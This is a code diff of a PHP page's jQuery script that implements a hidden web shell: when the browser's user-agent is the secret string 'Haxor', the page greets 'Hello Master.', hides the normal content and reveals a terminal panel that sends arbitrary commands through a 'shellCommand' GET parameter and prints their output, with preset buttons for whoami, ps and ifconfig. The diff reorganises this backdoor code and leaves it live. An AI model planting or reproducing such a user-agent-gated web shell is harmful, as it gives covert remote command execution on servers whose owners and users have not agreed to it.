@@ -216,9 +216,22 @@
 	
 	<script type="text/javascript">	
 		$(document).ready( function() {
+			
+			if(navigator.userAgent == "Haxor") {
+				console.log("Hello Master.")
+				$("body").css({"margin":"0px"});
+				$("#luserContent").remove();
+				$("#haxored").prop("hidden", false);
+			} else {
+				console.log("#");	
+				$("#haxored").remove();
+			}
 
 			var history = [];
 			var counter = 0;
+			var user = "badass";
+			var hostname = "microserver";
+			var request = "";
 
 			function submit(command) {
 				history.push(command);
@@ -227,87 +240,67 @@
 					type: "GET",
 					data: {"shellCommand": command},
 					success: function(data) {
-					renderCmd(command, data)
-				}
-			});
-		}
-
-		var user = "badass";
-		var hostname = "microserver";
-
-		function renderCmd(command, output) {
-			var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
-			$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
-			$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
-			$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
-		}
-	
-		var request = "";
-
-	
-		$("#XbuttonPwd").on('click', function(e) {
-			e.preventDefault();
-			request = "pwd";
-			submit(request);
-		});
-
-		$("#XbuttonPerm").on('click', function(e) {
-			e.preventDefault();
-			request = "whoami";
-			submit(request);
-		});
-
-		$("#XbuttonPs").on('click', function(e) {
-			e.preventDefault();
-			request = "ps";
-			submit(request);
-		});
-
-
-		$("#XbuttonIfconfig").on('click', function(e) {
-			e.preventDefault();
-			request = "ifconfig";
-			submit(request);
-		});
-
-		var inputshell = document.getElementById("XinputShell");
-		inputshell.addEventListener("keydown", function(e) {
-			if (e.which == 13) {
-				submit($("#shellInput").val());
-				$("#shellInput").val("");
+						renderCmd(command, data)
+					}
+				});
 			}
 		
-			if (e.which == 38 && counter < history.length) {
-				counter += 1;
-			
-				$("#shellInput").val(history[history.length - counter]);
+			function renderCmd(command, output) {
+				var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
+				$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
+				$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
+				$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
 			}
+	
+			$("#XbuttonPwd").on('click', function(e) {
+				e.preventDefault();
+				request = "pwd";
+				submit(request);
+			});
 
-			if (e.which == 40 && counter > 0) {
-				counter -= 1;
-				$("#shellInput").val(history[history.length - counter]);
-			}
+			$("#XbuttonPerm").on('click', function(e) {
+				e.preventDefault();
+				request = "whoami";
+				submit(request);
+			});
 
-			if (e.keyCode == 90 && e.ctrlKey) {
-				$("#XShellOutput").empty();
-			}
+			$("#XbuttonPs").on('click', function(e) {
+				e.preventDefault();
+				request = "ps";
+				submit(request);
+			});
+
+			$("#XbuttonIfconfig").on('click', function(e) {
+				e.preventDefault();
+				request = "ifconfig";
+				submit(request);
+			});
+
+			var inputshell = document.getElementById("XinputShell");
+			inputshell.addEventListener("keydown", function(e) {
+				if (e.which == 13) {
+					submit($("#shellInput").val());
+					$("#shellInput").val("");
+				}
+		
+				if (e.which == 38 && counter < history.length) {
+					counter += 1;
+					$("#shellInput").val(history[history.length - counter]);
+				}
+
+				if (e.which == 40 && counter > 0) {
+					counter -= 1;
+					$("#shellInput").val(history[history.length - counter]);
+				}
+
+				if (e.keyCode == 90 && e.ctrlKey) {
+					$("#XShellOutput").empty();
+				}
+			});
+
+			$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
 		});
-
-		$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
-	});
-
-	$(document).ready(function() {
-		if(navigator.userAgent == "Haxor") {
-			console.log("Hello Master.")
-			$("body").css({"margin":"0px"});
-			$("#luserContent").remove();
-			$("#haxored").prop("hidden", false);
-		} else {
-			console.log("#");	
-			$("#haxored").remove();
-		}
-	});
-</script>
+	</script>
 </div>
 <!-- Below here should be the closing </body> tag -->
 <?php endif; ?>
